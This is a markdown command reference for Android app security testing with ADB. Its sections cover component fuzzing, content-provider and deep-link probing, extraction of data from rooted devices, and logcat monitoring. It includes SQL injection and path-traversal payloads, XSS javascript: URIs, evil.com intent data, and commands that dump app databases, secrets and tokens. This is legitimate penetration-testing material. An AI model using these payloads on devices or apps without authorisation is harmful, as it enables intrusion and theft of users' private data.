# ADB Command Reference for Security Testing

## Device Connection & Info

```bash
# Connect to remote device
adb connect <ip>:<port>

# List connected devices
adb devices -l

# Device info
adb shell getprop ro.build.version.release    # Android version
adb shell getprop ro.build.version.sdk         # API level
adb shell getprop ro.product.model             # Device model
adb shell getprop ro.build.type                # Build type (userdebug/eng)

# Check root
adb shell su -c id
adb shell su -c "whoami"

# Check SELinux status
adb shell getenforce
```

## App Management

```bash
# Install APK (allow reinstall + downgrade)
adb install -r -d <apk_path>

# Uninstall
adb uninstall <package_name>

# List packages
adb shell pm list packages | grep <keyword>

# Get APK path
adb shell pm path <package_name>

# Pull APK from device
adb pull $(adb shell pm path <package_name> | cut -d: -f2)

# Full package info (permissions, components, flags)
adb shell dumpsys package <package_name>

# App info (UID, data dir, version)
adb shell dumpsys package <package_name> | grep -E "userId|dataDir|versionName|versionCode"

# Force stop
adb shell am force-stop <package_name>

# Clear app data
adb shell pm clear <package_name>
```

## Component Testing

### Activities
```bash
# Launch main activity
adb shell monkey -p <package_name> -c android.intent.category.LAUNCHER 1

# Start specific activity
adb shell am start -n <package_name>/<activity_class>

# With string extras
adb shell am start -n <pkg>/<activity> --es "key" "value"

# With int extras
adb shell am start -n <pkg>/<activity> --ei "key" 123

# With boolean extras
adb shell am start -n <pkg>/<activity> --ez "key" true

# With URI data
adb shell am start -n <pkg>/<activity> -d "http://evil.com"

# With action
adb shell am start -a <action> -n <pkg>/<activity>

# With multiple extras
adb shell am start -n <pkg>/<activity> --es "url" "javascript:alert(1)" --es "title" "test"
```

### Services
```bash
# Start service
adb shell am startservice -n <pkg>/<service>

# Start with extras
adb shell am startservice -n <pkg>/<service> --es "command" "delete"

# Stop service
adb shell am stopservice -n <pkg>/<service>
```

### Broadcast Receivers
```bash
# Send broadcast
adb shell am broadcast -a <action>

# With extras
adb shell am broadcast -a <action> --es "data" "payload"

# To specific component
adb shell am broadcast -n <pkg>/<receiver> -a <action>

# With data URI
adb shell am broadcast -a <action> -d "content://evil"
```

### Content Providers
```bash
# Query provider
adb shell content query --uri content://<authority>/

# Query with projection
adb shell content query --uri content://<authority>/users --projection "name:password"

# Query with selection (SQL injection test)
adb shell content query --uri content://<authority>/users --where "1=1) --"
adb shell content query --uri content://<authority>/users --where "1=1 UNION SELECT sql FROM sqlite_master--"

# Insert data
adb shell content insert --uri content://<authority>/users --bind name:s:test --bind email:s:test@test.com

# Read file via provider
adb shell content read --uri content://<authority>/file/../../etc/passwd

# Delete
adb shell content delete --uri content://<authority>/users --where "id=1"
```

### Deep Links
```bash
# Open deep link
adb shell am start -a android.intent.action.VIEW -d "<scheme>://<host>/<path>"

# With category
adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d "<url>"

# Test payloads
adb shell am start -a android.intent.action.VIEW -d "myapp://callback?token=stolen"
adb shell am start -a android.intent.action.VIEW -d "myapp://webview?url=javascript:alert(1)"
adb shell am start -a android.intent.action.VIEW -d "myapp://file?path=../../etc/passwd"
```

## Data Extraction (Root)

```bash
# App data directory
adb shell su -c "ls -laR /data/data/<pkg>/"

# SharedPreferences
adb shell su -c "cat /data/data/<pkg>/shared_prefs/*.xml"

# Databases
adb shell su -c "ls -la /data/data/<pkg>/databases/"
adb shell su -c "sqlite3 /data/data/<pkg>/databases/<db> '.tables'"
adb shell su -c "sqlite3 /data/data/<pkg>/databases/<db> '.schema'"
adb shell su -c "sqlite3 /data/data/<pkg>/databases/<db> 'SELECT * FROM users;'"
adb shell su -c "sqlite3 /data/data/<pkg>/databases/<db> '.dump'"

# Files
adb shell su -c "find /data/data/<pkg>/ -type f -name '*.txt' -o -name '*.json' -o -name '*.xml' -o -name '*.key' -o -name '*.pem'"
adb shell su -c "cat /data/data/<pkg>/files/config.json"

# External storage
adb shell su -c "ls -laR /sdcard/Android/data/<pkg>/"

# Search for sensitive strings
adb shell su -c "grep -rl 'password\|token\|secret\|api_key' /data/data/<pkg>/"

# Pull entire data directory
adb shell su -c "tar czf /sdcard/app_data.tar.gz /data/data/<pkg>/"
adb pull /sdcard/app_data.tar.gz
```

## Backup Extraction

```bash
# Create backup (if allowBackup=true)
adb backup -apk -shared <package_name> -f backup.ab

# Convert to tar (requires android-backup-extractor or dd+openssl)
dd if=backup.ab bs=24 skip=1 | python3 -c "import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > backup.tar
tar xf backup.tar
```

## Logging & Monitoring

```bash
# Clear logcat
adb logcat -c

# Monitor app logs
adb logcat --pid=$(adb shell pidof <package_name>) -v time

# Save to file
adb logcat --pid=$(adb shell pidof <package_name>) -v time -d > logcat.txt

# Filter for sensitive data
adb logcat -d | grep -iE "token|password|secret|key|auth|session|cookie"

# Crash logs
adb logcat -b crash -d

# Monitor crash tombstones
adb shell su -c "ls -lt /data/tombstones/"
```

## Network

```bash
# List network connections
adb shell su -c "netstat -tlnp"
adb shell su -c "ss -tlnp"

# Check cleartext traffic config
adb shell dumpsys package <pkg> | grep -i cleartext

# DNS resolution test
adb shell nslookup <domain>

# Network interfaces
adb shell ifconfig
adb shell ip addr
```

## Screenshots & Screen Recording

```bash
# Screenshot
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png ./evidence/

# Screen recording (max 180 seconds)
adb shell screenrecord /sdcard/recording.mp4
# Ctrl+C to stop
adb pull /sdcard/recording.mp4 ./evidence/

# UI hierarchy dump (for automation)
adb shell uiautomator dump /sdcard/ui.xml
adb pull /sdcard/ui.xml
```

## Permissions

```bash
# List app permissions
adb shell dumpsys package <pkg> | grep "permission"

# Grant runtime permission
adb shell pm grant <pkg> android.permission.READ_CONTACTS

# Revoke permission
adb shell pm revoke <pkg> android.permission.READ_CONTACTS

# List all dangerous permissions granted
adb shell dumpsys package <pkg> | grep -A1 "runtime permissions"
```
